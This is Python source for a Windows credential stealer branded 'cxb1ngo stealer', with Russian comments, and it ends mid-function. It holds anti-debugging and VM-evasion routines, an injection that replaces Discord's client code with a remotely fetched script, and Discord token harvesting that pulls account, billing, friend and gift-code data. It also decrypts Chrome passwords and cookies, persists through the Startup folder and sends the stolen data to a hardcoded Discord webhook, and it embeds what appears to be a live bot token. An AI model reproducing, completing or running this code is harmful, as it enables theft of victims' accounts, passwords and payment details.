import os
import re
import sys
import time
import shutil
import ctypes
import winreg
import requests
import urllib
import random
import warnings
import threading
import subprocess
import datetime
from sys import executable, stderr
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer

# ========== ГЛОБАЛЬНАЯ ОТЛАДКА ==========
import sys
import os
import traceback
import datetime

if getattr(sys, 'frozen', False):
    base_dir = os.path.dirname(sys.executable)
else:
    base_dir = os.path.dirname(os.path.abspath(__file__))

log_dir = os.path.join(base_dir, "logs")
try:
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
except:
    log_dir = base_dir

DEBUG_LOG = os.path.join(log_dir, "debug.log")
CRASH_LOG = os.path.join(log_dir, "crash.log")

def log_message(msg):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {msg}\n")
    except:
        pass

def send_log_to_api(text, log_type='text'):
    try:
        url = "https://JJ3RD0XXS.pythonanywhere.com/submit_log"
        payload = {'user_id': USER_ID, 'type': log_type, 'content': text}
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        log_message(f"Ошибка отправки лога в API: {e}")

LOG_COUNTER_FILE = os.path.join(base_dir, "log_counter.txt")

def get_next_log_number():
    """Возвращает следующий номер лога и увеличивает счётчик."""
    try:
        with open(LOG_COUNTER_FILE, 'r') as f:
            num = int(f.read().strip())
    except:
        num = 0
    num += 1
    try:
        with open(LOG_COUNTER_FILE, 'w') as f:
            f.write(str(num))
    except:
        pass
    return num

def global_excepthook(exctype, value, tb):
    try:
        with open(CRASH_LOG, "a", encoding="utf-8") as f:
            f.write("".join(traceback.format_exception(exctype, value, tb)))
    except:
        pass
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, f"Критическая ошибка!\nПодробности в {CRASH_LOG}", "Ошибка", 0)
    except:
        pass
    sys.exit(1)

sys.excepthook = global_excepthook

start_marker = os.path.join(log_dir, "started.txt")
try:
    with open(start_marker, "w") as f:
        f.write("started\n")
except:
    pass

log_message("Программа запущена, отладка активирована")
# =========================================

# ========== ПРОВЕРКА ПОДПИСКИ ==========
USER_ID = "REPLACE_ME"                     # <-- БОТ ПОДСТАВЛЯЕТ ID
API_URL = "https://JJ3RD0XXS.pythonanywhere.com/check_subscription"   # ТВОЙ API

def check_subscription():
    try:
        response = requests.get(f"{API_URL}?user_id={USER_ID}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('active'):
                log_message("Подписка активна")
                return True
            else:
                log_message("Подписка неактивна")
                sys.exit(0)
        elif response.status_code == 404:
            # Пользователь не найден — регистрируем с 30 днями подписки
            log_message("Пользователь не найден, регистрируем...")
            register_url = "https://JJ3RD0XXS.pythonanywhere.com/register_user"
            payload = {"telegram_id": USER_ID, "days": 30, "username": "AutoReg"}
            reg_resp = requests.post(register_url, json=payload, timeout=10)
            if reg_resp.status_code == 200:
                log_message("Пользователь зарегистрирован, подписка активна")
                return True
            else:
                log_message("Ошибка регистрации")
                sys.exit(0)
        else:
            log_message(f"Ошибка API: {response.status_code}")
            sys.exit(0)
    except Exception as e:
        log_message(f"Ошибка проверки подписки: {e}")
        sys.exit(0)

log_message("Программа запущена")
class NullWriter(object):
    def write(self, arg):
        pass

warnings.filterwarnings("ignore")
null_writer = NullWriter()
stderr = null_writer

ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)

from Crypto.Cipher import AES

# ================== НАСТРОЙКИ TELEGRAM ==================
#TG_BOT_TOKEN = "8559557105:AAH-mkWJgOaHOoKSXs05tPB9Xz52Asb1Jak"
#TG_CHAT_ID = "5084593394"


def antidebug():
    checks = [check_windows, check_ip, check_registry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()

def exit_program(reason):
    print(f"[DEBUG] Антиотладка: {reason}")

def check_windows():
    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'cse pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit', 'george',}:
            pid = ctypes.c_ulong(0)
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value != 0:
                try:
                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
                except:
                    pass
            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
        return True

    while True:
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
        time.sleep(0.5)

def check_ip():
    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}    
    while True:
        try:
            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
            if ip in blacklisted:
                exit_program('Blacklisted IP Detected')
            return
        except:
            pass

def check_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
        subkey_count = winreg.QueryInfoKey(key)[0]
        for i in range(subkey_count):
            subkey = winreg.EnumKey(key, i)
            if subkey.startswith('VMWARE'):
                exit_program('VM Detected')
        winreg.CloseKey(key)
    except:
        pass

def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        exit_program('VM Detected')

cname = ""
smallcname = ""
footerc = "cxb1ngo stealer"
words = "Files"

h00k = "https://discord.com/api/webhooks/1472583611646607474/_S4PCLt84A4PuS4VbVw9ZssOYw2urwRdkLkUluw3kFaZV6GBT8-1Acc5KfapoNlS4Jd8"
log_message("Программа запущена")

inj3c710n_url = f"https://raw.githubusercontent.com/wtf{cname}wtf/index/main/injection.js"

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G371P():
    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:return "None"

def Z1PF01D3r(foldername, target_dir):
    zipobj = ZipFile(temp+"/"+foldername + '.zip', 'w', ZIP_DEFLATED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            if not "user_data" in fn:
                zipobj.write(fn, fn[rootlen:])

def G37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G37D474(blob_out)

def D3CrYP7V41U3(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            try: decrypted_pass = decrypted_pass.decode()
            except:pass
            return decrypted_pass

def L04DUr118(h00k, data='', headers=''):
    for i in range(8):
        try:
            if headers:
                response = requests.post(h00k, data=data, headers=headers, timeout=10)
            else:
                response = requests.post(h00k, data=data, timeout=10)
            if response.status_code in (200, 204):
                return response
        except Exception as e:
            print(f"Попытка {i+1} ошибка: {e}")
            time.sleep(1)
    return None

def UP104D(name, link, archive_link=None):
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}

    if name == "kiwi":
        try:
            log_message("Начало обработки kiwi")
            # Разбиваем список файлов по папкам
            blocks = link.split("\n\n")
            endlist = []
            for block in blocks:
                lines = [ln.strip() for ln in block.split("\n") if ln.strip()]
                if not lines:
                    continue
                folder = lines[0]
                files_val = "\n".join(lines[1:]) if len(lines) > 1 else "Пусто"
                endlist.append({"name": folder[:256], "value": files_val[:1024], "inline": False})

            # Если есть ссылка на архив, добавляем отдельное поле
            if archive_link and len(endlist) > 0:
                endlist.append({
                    "name": "📦 Скачать все файлы архивом",
                    "value": f"[Ссылка на архив]({archive_link})",
                    "inline": False
                })

            if not endlist:
                log_message("Нет данных для отправки (kiwi)")
                return

            data = {
                "content": GLINFO,
                "embeds": [{
                    "color": 2895667,
                    "fields": endlist,
                    "title": f"{cname} | File {words}",
                    "footer": {"text": f"{footerc}", "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
                }],
                "username": f"{cname} | t.me/{smallcname}r",
                "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
            }

            json_data = dumps(data)
            if len(json_data) > 8000:
                log_message("Сообщение слишком длинное, обрезаем")
                if archive_link:
                    # Оставляем только ссылку на архив
                    endlist = [endlist[-1]]
                    data["embeds"][0]["fields"] = endlist
                    json_data = dumps(data)
                else:
                    data["embeds"][0]["fields"] = data["embeds"][0]["fields"][:3]
                    json_data = dumps(data)

            L04DUr118(h00k, data=json_data.encode(), headers=headers)
            log_message("Отправка kiwi выполнена")
        except Exception as e:
            log_message(f"Ошибка в UP104D (kiwi): {e}")
            import traceback
            log_message(traceback.format_exc())

    elif "Data Searcher" in name:
        # Если используется Data Searcher – обрабатываем отдельно
        try:
            data = {
                "content": GLINFO,
                "embeds": [{
                    "title": f"{cname} | Data Extractor",
                    "color": 2895667,
                    "fields": link,
                    "footer": {"text": f"{footerc}", "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
                }],
                "username": f"{cname} | t.me/{smallcname}r",
                "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
            }
            L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
            send_log_to_api(f"{GLINFO} 📂 Данные экстрактора отправлены", 'text')
        except Exception as e:
            log_message(f"Ошибка в UP104D (Data Searcher): {e}")

def G108411NF0():
    try:
        username = os.getenv("USERNAME")
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{IP}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
        contry = ipdata["country_name"]
        contryCode = ipdata["country_code"].lower()
        if contryCode == "not found":
            globalinfo = f":rainbow_flag:  - `{username.upper()} | {IP} ({contry})`"
        else:
            globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {IP} ({contry})`"
        return globalinfo

    except:
        return f":rainbow_flag:  - `{username.upper()}`"

def TrU57(C00K13s):
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) < -1 else False
    return DETECTED

def inj3c710n():
    username = os.getlogin()
    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    try:
                                                        injeCTmED0cT0r_cont = requests.get(inj3c710n_url, timeout=5).text
                                                    except:
                                                        return

                                                    injeCTmED0cT0r_cont = injeCTmED0cT0r_cont.replace("%WEBHOOK%", h00k)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(injeCTmED0cT0r_cont)

try:
    inj3c710n()
except Exception:
    pass

def G37C0D35(token):
    try:
        codes = ""
        headers = {"Authorization": token,"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())

        for code in codess:
            try:codes += f"<:black_gift:1184971095003107451> **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
            except:pass

        nitrocodess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)).read().decode())
        if nitrocodess == []: return codes

        for element in nitrocodess:
            
            sku_id = element['sku_id']
            subscription_plan_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']

            url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={subscription_plan_id}"
            nitrrrro = loads(urlopen(Request(url, headers=headers)).read().decode())

            for el in nitrrrro:
                cod = el['code']
                try:codes += f"<:black_gift:1184971095003107451> **{name}**\n<:Rightdown:891355646476296272> `https://discord.gift/{cod}`\n"
                except:pass
        return codes
    except:return ""

def G3781111N6(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False

    if billingjson == []: return "`None`"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing

def G3784D63(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]

    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def G37UHQFr13ND5(token):
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return "`No HQ Friends Found`"

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    return uhqlist if uhqlist != '' else "`No HQ Friends Found`"

def G37UHQ6U11D5(token):
    try:
        uhqguilds = ''
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
        for guild in guilds:
            if guild["approximate_member_count"] < 1: continue
            if guild["owner"] or guild["permissions"] == "4398046511103":
                inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
                try:    cc = "https://discord.gg/"+str(inv[0]['code'])
                except: cc = False
                uhqguilds += f"<:blackarrow:1095740975197995041> [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
        if uhqguilds == '': return '`No HQ Guilds Found`'
        return uhqguilds
    except:
        return 'No HQ Guilds Found'

def G3770K3N1NF0(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = ""

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`' if userjson["phone"] != None else "`None`"

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def CH3CK70K3N(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    try:
        with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
            shutil.copyfileobj(src_file, dst_file)
    except Exception:
        pass

def Tr1M(obj):
    if len(obj) > 1000: 
        f = obj.split("\n")
        obj = ""
        for i in f:
            if len(obj)+ len(i) >= 1000: 
                obj += "..."
                break
            obj += i + "\n"
    return obj

def UP104D70K3N(token, path):
    log_message("UP104D70K3N вызвана")
    global h00k, cname, smallcname, footerc, GLINFO
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
    try:
        username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
    except Exception as e:
        log_message(f"Ошибка получения данных пользователя: {e}")
        return
    if phone == "": phone = "`None`"
    badge = G3784D63(flags)
    badges_value = f"{nitro}{badge}"
    if badges_value == "": badges_value = ":lock:"
    billing = G3781111N6(token)
    if billing == "": billing = ":lock:"
    friends_raw = G37UHQFr13ND5(token)
    if not friends_raw or friends_raw in ("False", "`No HQ Friends Found`"):
        friends_value = ":lock:"
    else:
        friends_value = Tr1M(str(friends_raw))
        if len(friends_value) > 1000: friends_value = friends_value[:997] + "..."
    guilds_raw = G37UHQ6U11D5(token)
    if not guilds_raw or guilds_raw in ("False", "`No HQ Guilds Found`"):
        guilds_value = ":lock:"
    else:
        guilds_value = Tr1M(str(guilds_raw))
        if len(guilds_value) > 1000: guilds_value = guilds_value[:997] + "..."
    codes_raw = G37C0D35(token)
    if codes_raw == "":
        codes_value = "`No Gifts Found`"
    else:
        codes_value = Tr1M(str(codes_raw))
        if len(codes_value) > 1000: codes_value = codes_value[:997] + "..."
    path = path.replace("\\", "/")
    raw_username = f"{cname} | t.me/{smallcname}r"
    safe_username = raw_username[:77] + "..." if len(raw_username) > 80 else raw_username
    fields = [
        {"name": "<:hackerblack:1095747410539593800> Token:", "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"},
        {"name": "<:mail:1095741024678191114> Email:", "value": f"`{email}`", "inline": True},
        {"name": "<:phone:1095741029832990720> Phone:", "value": f"{phone}", "inline": True},
        {"name": "<a:blackworld:1095741984385290310> IP:", "value": f"`{G371P()}`", "inline": True},
        {"name": "<a:blackhypesquad:1095742323423453224> Badges:", "value": badges_value, "inline": True},
        {"name": "<a:blackmoneycard:1095741026850852965> Billing:", "value": billing, "inline": True},
        {"name": "<:friends:1111401676511924448> HQ Friends:", "value": friends_value, "inline": False},
        {"name": "<:black_crown:1184938153291829288> HQ Guilds:", "value": guilds_value, "inline": False},
        {"name": "<:black_gift:1184971095003107451> Gift Codes:", "value": codes_value, "inline": False}
    ]
    payload = {
        "content": f'{GLINFO} **Found in** `{path}`',
        "username": safe_username,
        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
        "embeds": [{"color": 2895667, "fields": fields}]
    }
    response = L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
    if response and response.status_code in (200, 204):
        log_message("Токен успешно отправлен")
    else:
        log_message(f"Не удалось отправить токен. Статус: {response.status_code if response else 'None'}")

def r3F0rM47(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def Wr173F0rF113(data, name):
    path = os.path.join(temp, f"cs{name}.txt")
    try:
        with open(path, 'w', encoding='utf-8') as f:
            for line in data:
                if line:
                    f.write(f"{line}\n")
        log_message(f"Файл {path} создан, размер: {os.path.getsize(path)} байт")
    except Exception as e:
        log_message(f"Ошибка записи файла {name}: {e}")

def G3770K3N(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global T0K3Ns
                        if CH3CK70K3N(token):
                            if not token in T0K3Ns:
                                T0K3Ns += token
                                UP104D70K3N(token, path)

def SQ17H1N6(pathC, tempfold, cmd):
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(cmd)
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    return data

def G37P455W(path, arg):
    try:
        global P455w, P455WC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in k3YW0rd:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in p45WW0rDs: p45WW0rDs.append(old)
                P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}")
                P455WC0UNt += 1
        Wr173F0rF113(P455w, 'passwords')
    except:pass

def G37C00K13(path, arg):
    try:
        global C00K13s, C00K1C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")

        pathKey = path + "/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in k3YW0rd:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in c00K1W0rDs: c00K1W0rDs.append(old)
                C00K13s.append(f"{row[0]}   TRUE    /   FALSE   2597573456  {row[1]}    {D3CrYP7V41U3(row[2], master_key)}")
                C00K1C0UNt += 1
        Wr173F0rF113(C00K13s, 'cookies')
    except:pass

def G37CC5(path, arg):
    try:
        global CCs, CC5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

